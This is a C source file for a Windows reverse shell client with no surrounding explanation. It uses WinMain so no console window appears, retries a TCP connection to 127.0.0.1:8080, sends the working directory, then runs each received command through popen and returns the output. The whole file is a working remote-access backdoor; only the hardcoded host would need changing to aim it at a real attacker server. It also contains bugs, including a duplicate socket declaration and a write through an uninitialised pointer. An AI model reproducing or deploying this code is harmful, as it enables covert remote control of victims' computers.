#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <unistd.h>


int connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
    inet_pton(AF_INET, server_ip, &serv_addr->sin_addr);
    if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
        return 0;
    } else {
        return 1;
    }
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    
    char cmd_buff[1024];
    char output_buff[1024]; 
    char cwd[1024];
    FILE *output;

    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    while (connectToServer(&serv_addr, client_socket, server_ip) != 1){
        Sleep(1000);
    }

    getcwd(cwd, 1024);
    send(client_socket, cwd, strlen(cwd), 0);

    while (1){
        
        memset(cmd_buff, 0, 1024);
        memset(output_buff, 0, 1024);
        recv(client_socket, cmd_buff, 1024, 0);
        char cmd_buff_copy[1024];
        strcpy(cmd_buff_copy, cmd_buff);
        char* cmd_arg1 = strtok(cmd_buff_copy, " ");
        if (strcmp(cmd_arg1, "cd") == 0){
            // code for if the command was cd
            strcpy(cwd, &cmd_buff[3]);
            chdir(cwd);
            getcwd(cwd, 1024);
            strcat(output_buff, "\n");
            strcat(output_buff, "cURR_dIR");
            strcat(output_buff, cwd);
        } else {
            // code for any other command aside from cd
            output = popen(cmd_buff, "r"); 
            if (output != NULL){
                while(1){
                    char line[1024];
                    char* read = fgets(line, 1024, output); 
                    if (!read){
                        break;
                    }
                    send(client_socket, line, strlen(line), 0);
                }
            } else {
                char* err_msg;
                sprintf(err_msg, "Error executing the command %s \n", cmd_buff);
                send(client_socket, err_msg, strlen(err_msg), 0);
            }
            
            getcwd(cwd, 1024);
            strcat(output_buff, "cURR_dIR");
            strcat(output_buff, cwd);
        }
        send(client_socket, output_buff, strlen(output_buff), 0);
        pclose(output);
    }
    return 1;
}




